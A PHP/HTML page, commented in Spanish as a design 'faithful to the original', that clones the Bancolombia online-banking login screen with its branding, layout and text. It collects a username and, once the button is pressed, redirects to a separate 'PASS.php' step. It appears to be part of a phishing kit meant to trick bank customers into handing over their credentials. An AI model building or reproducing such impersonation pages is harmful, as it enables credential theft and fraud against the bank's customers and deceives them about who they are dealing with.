<?php
// a/login.php - DISEÑO SUCURSAL VIRTUAL FIEL A LA ORIGINAL
session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Bancolombia - Iniciar Sesión</title>
    <link rel="icon" type="image/png" href="../img/logo.png" />
    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap');
        
        body { 
            background-color: #F7F7F7; 
            margin: 0; padding: 0; 
            font-family: 'Open Sans', sans-serif; 
            color: #333;
        }

        /* Líneas de colores de fondo exactas */
        .bg-lines {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('../img/bg-bancolombia.png'); /* Usa la imagen del fondo original */
            background-size: cover;
            z-index: 1;
        }

        .main-card {
            position: relative;
            z-index: 10;
            background: #ffffff;
            margin: 20px;
            margin-top: 100px;
            padding: 40px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            text-align: center;
        }

        .logo-top { width: 200px; margin-bottom: 40px; }

        .welcome-text { font-size: 24px; font-weight: 300; margin-bottom: 10px; }
        .instruction-text { font-size: 14px; color: #666; margin-bottom: 40px; line-height: 1.4; }

        .input-box {
            position: relative;
            margin-bottom: 30px;
            text-align: left;
        }

        .input-box input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #ccc;
            padding: 10px 0;
            font-size: 16px;
            outline: none;
            background: transparent;
        }

        .input-box label {
            font-size: 14px;
            color: #666;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .links-aux {
            text-align: left;
            font-size: 13px;
            font-weight: 600;
            color: #000;
            text-decoration: underline;
            margin-bottom: 40px;
            cursor: pointer;
        }

        #btn-login {
            width: 100%;
            height: 50px;
            border-radius: 25px;
            border: none;
            background-color: #E6E6E6;
            color: #999;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
        }

        #btn-login.active {
            background-color: #FDDA24;
            color: #000;
            cursor: pointer;
        }

        .info-blue-box {
            background-color: #E3F5FC;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
            text-align: left;
        }
    </style>
</head>
<body>

    <div class="bg-lines"></div>

    <div class="main-card">
        <img src="../img/logo.png" class="logo-top">
        
        <div class="info-blue-box">
            <img src="../img/info-icon.png" width="20">
            <div>
                <strong style="display:block; margin-bottom:5px;">¡Prográmate!</strong>
                <span style="font-size: 12px; color: #444;">Consulta el estado de nuestros canales y los mantenimientos programados. <br><strong>Más info aquí.</strong></span>
            </div>
        </div>

        <div class="welcome-text">¡Hola!</div>
        <div class="instruction-text">Ingresa los datos para gestionar tus productos y hacer transacciones.</div>

        <div class="input-box">
            <label><img src="../img/user-icon.png" width="18"> Usuario</label>
            <input type="text" id="txt-usuario" autocomplete="off">
        </div>

        <div class="links-aux">¿Olvidaste tu usuario?</div>

        <button id="btn-login" disabled>Iniciar sesión</button>
    </div>

    <script>
        $(document).ready(function() {
            $("#txt-usuario").on("input", function() {
                if ($(this).val().trim().length >= 4) {
                    $("#btn-login").addClass("active").prop("disabled", false);
                } else {
                    $("#btn-login").removeClass("active").prop("disabled", true);
                }
            });

            $("#btn-login").click(function() {
                window.location.href = "PASS.php";
            });
        });
    </script>
</body>
</html>
